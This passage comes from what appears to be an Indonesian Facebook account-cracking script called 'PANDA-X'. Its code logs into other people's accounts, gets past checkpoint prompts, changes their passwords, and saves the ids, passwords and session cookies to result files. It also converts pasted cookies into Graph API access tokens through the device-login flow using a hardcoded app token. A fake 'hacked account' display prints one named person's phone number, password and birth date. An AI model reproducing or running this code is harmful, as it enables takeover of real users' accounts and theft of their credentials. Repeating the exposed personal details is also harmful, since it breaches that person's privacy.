			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(P,til,P,P,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (P,user,pwbaru[0],coki))
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(P,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (P,user,pw,coki))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(P))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(P,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(P))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (P,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),P,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s [+] %s"%(P,oh))
	else:
		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(P))
		



###------------------------------------------------------------------>
#     *LOADING TOOLS
###------------------------------------------------------------------>

###------------------------------------------------------------------>
#     *LOG WELCOME
###------------------------------------------------------------------>
def Authkey():
	try:
		lologoku()
		print("")
		keyku = random.choice(['JPUTG-ECXOC-MSAJE-MBQZR','IVXKG-ZRMKU-PMMAY-JJKBI','FRRPQ-EFBJC-UWCAQ-MZGJX','DONT KEY PLEAS REFRESH TOOLS'])
		kontol = Tree(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Key :[bold white]  [ [bold green]{keyku}[bold white] ] ",style=f"{color_panel}"),guide_style="bold grey100")
		kontol.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] En :[bold white]Please type ( [red]admin[bold white] ) If Key License Is Inactive\n[bold white][[bold cyan]•[bold white]] Id :[bold white]Silahkan Ketik ( [red]admin[bold white] ) Jika Key License Tidak Aktif",style=f"{color_panel}"),guide_style="bold grey100")
		prints(kontol)
		key = str(input(f'     └──>{h} Paste Your Keys :{x} '))
		if key in ['admin','Admin','ADMIN']:
			#os.popen('play-audio scmusic/key.mp3')       
			time.sleep(3)
			os.system("xdg-open https://m.facebook.com/jun.WA08988884579");exit()
		result = Key.activate(token=auth,\
		rsa_pub_key=RSAPubKey,\
		product_id=22158, \
		key=key,\
		machine_code=Helpers.GetMachineCode())
		if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
			print("")
			print(" ╰─ \x1b[1;91mOpshh this key is invalid, contact admin to get a new key..!\33[m".format(result[1]))
			open('PANDA-X/mykey.json', 'w').write(json.dumps({'License': key}))
			time.sleep(2)
		else:
			os.system('rm -rf PANDA-X/mykey.json')
			open('PANDA-X/mykey.json', 'w').write(json.dumps({'License': key}))
			print("")
			print("     ╰─\x1b[1;92m Key License Valid..!\33[m")
			time.sleep(3)
			login()
	except:pass

def comex():
	try:
		piu = json.loads(open('PANDA-X/mykey.json', 'r').read())['License']
		try:
			key=piu,\
			helojun()
		except KeyError:
			print("")
			print("  \x1b[1;91mOpshh Your License Key Is Inactive\33[m")
			time.sleep(4)
			Authkey()
		except requests.exceptions.ConnectionError:
			li = ' \tTak Dapat Login, Periksa Kuota Kamu'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		print("")
		print("  \x1b[1;91mOpshh Your License Key Is Inactive\33[m")
		time.sleep(4)
		Authkey()
		
def helojun():
	try:
		print("")
		key = json.loads(open('PANDA-X/mykey.json', 'r').read())['License']
		result = Key.activate(token=auth,\
		rsa_pub_key=RSAPubKey,\
		product_id=22158, \
		key=key,\
		machine_code=Helpers.GetMachineCode())
		if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
			print("  \x1b[1;91mOpshh this key is invalid, contact admin to get a new key..!\33[m".format(result[1]))
			time.sleep(5);Authkey()
		else:
			login()
	except:pass


def target():
	global loop
	
	prints(Panel(f"""{H2}• {P2}You Can Only Use This Feature 3 times in 1 Day {H2} •""",width=55,padding=(0,1),style=f"{color_panel}"))
	targ= input("\33[m╰─ > Your Link Acount : \033[32m")
	if targ in ['https://www.facebook.com/jumadilwawonii.jumaa']:
		print("")
		haecerjoin_tm(f'\r{x}   [{h}Wait{x}]{h} {x}  PROSES {x} -:{h} 1{x} ')
		time.sleep(2.3)
		print("")
		prints(Panel(f"""{H2}• {P2}Account Has Been Hacked, Thanks For Using {H2} •""",width=55,padding=(0,3),style=f"{color_panel}"))
		print("")
		tree = Tree(Panel.fit(f"""[bold green]Succees[bold white]""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(f"Adres     : [bold green]{negriku}-Morowali")
		tree.add(f"Name      : [bold green]Jumadil Wawonii Anitha Jumaa")
		tree.add(f"Telephone : [bold green]0822-9261-1456 ")
		tree.add(f"Password  : [bold green]jumadil01")
		tree.add(f"TTL       : [bold green]02 march 1993\n")
		prints(tree) 
	else:
		tree = Tree(Panel.fit(f"""[bold red]Failed[bold white]""",style=f"{color_panel}"),guide_style="bold grey100")
		prints(Panel(f"""{H2}• {P2}Acces Login Ke Akun Gagal, Device Kamu Tidak Tidak Suport {H2} •""",width=70,padding=(0,2),style=f"{color_panel}"))
		huhh = input(" [÷] Gunakan Lagi? Y/t : ")
		if huhh in ['y','Y']:
			login()
		else:
			exit()
###------------------------------------------------------------------>
#     *LOGIN-COKIES
###------------------------------------------------------------------>
def lologin():
	prints(Panel(f"""{tulisan}Cubit Layar Terminal Kamu Agar Tidak Menyebabkan Kerusakan Pada Tampilan""",width=80,padding=(0,1),style=f"{color_panel}"));time.sleep(5);token()


def login_terus():
	try:
		os.system('clear')
		lologoku()
		cetak(nel('[bold white][[bold red]●[bold white]] Dilarang Keras Mengunakan Akun Utama\n[bold white][[bold red]●[bold white]] Login Ini Menggandung Bot Komen.!\n\n[bold white][[bold cyan]●[bold white]][bold green] Pastikan Cokies Anda Masih Valid Dan Fresh\n[bold white][[bold cyan]●[bold white]][bold green] Matikan Mode Gratis Pada Akun Tumabal\n[bold white][[bold cyan]●[bold white]][bold green] Jika Tumbal On a2f Login dulu di\n[bold white][[bold cyan]●[bold white]][bold hot_pink2] https://business.facebook.com/business_locations\n', width=80,subtitle="╭────[white][[blue]COKIES ANDA[white]][blue]", subtitle_align="left",padding=(0,3),style=f"{color_panel}"))
		your_cookies = input(N+''+B+'   ╰─ > \033[32m')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookies': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("\n ╰─ >> \033[91;1mCokiess Loo Kagak Berfungsi..", end='\r');time.sleep(3.5);print("                     ", end='\r');login_terus()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookies': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookies': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookies': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookies': your_cookies}).text
							tok = re.search('"access_token": "(.*?)"', str(response7)).group(1).replace('["','')
							print("")
							sayy = Tree(Panel.fit(f"\n[bold green]{tok}\n",width=70,title=f"[bold green]Your-Token",subtitle=f"[bold green]GUNAKAN SEWAJARNYA",style=f"{color_panel}"))
							get = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':your_cookies})
							col = requests.get('https://graph.facebook.com/me?fields=friends&access_token='+tok, cookies={'cookie':your_cookies})
							namaku = json.loads(get.text)['name']
							userku = json.loads(get.text)['id']
							mi = json.loads(col.text)['friends']
							iso = (mi['summary']['total_count'])
							sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Idz   :[bold green] {userku}",style=f"{color_panel}"),guide_style="bold grey100")
							sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] name  :[bold green] {namaku}",style=f"{color_panel}"),guide_style="bold grey100")
							sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Teman :[bold green] {iso}",style=f"{color_panel}"),guide_style="bold grey100")
							sayy.add(Panel.fit(f"[bold white][[bold cyan]•[bold white]] Cokies Tersimpan Di[bold green] PANDA-X/cokiku.txt\n[bold white][[bold cyan]•[bold white]] Token  Tersimpan Di[bold green] PANDA-X/tokenku.txt",style=f"{color_panel}"),guide_style="bold grey100")
							prints(sayy)
							open("PANDA-X/cokiku.txt","w").write(your_cookies)
							open("PANDA-X/tokenku.txt","w").write(tok)
							time.sleep(0.5);lologin()
			except Exception as e:
				os.system('rm -rf PANDA-X/cokiku.txt');os.system('rm -rf PANDA-X/tokenku.txt')
				cetak(nel('[bold red]\nYahaha Cokies Lu kgk Kagak Becus, Cek Tumbal+Janggan A2F+Janggan Mode Gratis\n─────────────────────────────────────────────────────────────────────────────\n[bold white][01] [bold green]Daptkan Cookies\n[bold white][02][bold green] Login Lagi\n\n', subtitle="╭────[white][[blue]INPUT[white]][blue]", subtitle_align="left",padding=(0,5),style=f"{color_panel}"))
				Oi = input(N+''+B+'   ╰─ > \033[32m')
				if Oi in ['01','1']:
					os.system("xdg-open https://wa.me/+6282196816220?text=Maseh+Aku+Mau+Crack+Tapi+Ra+Ana+Cokies,+Kowe+Ana+Cokies+Ora+Mas?🗿");login_terus()
				if Oi in ['02','2']:
					login_terus()
	except:pass


###------------------------------------->
#     *BAGIAN MASUK 
###------------------------------------->
def cuyy__():
	try:os.system('git pull')
	except:pass
	try:os.mkdir('PANDA-X')
	except:pass
	try:os.mkdir('PANDA-X/result-cp')
	except:pass
	try:os.mkdir('PANDA-X/result-ok')
	except:pass
	try:os.mkdir('/sdcard/PANDA-X')
	except:pass
	try:os.mkdir('/sdcard/PANDA-X/result-ok')
	except:pass
	try:os.mkdir('/sdcard/PANDA-X/result-cp')
	except:pass
	try:os.mkdir('/sdcard/JUNZ-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	comex()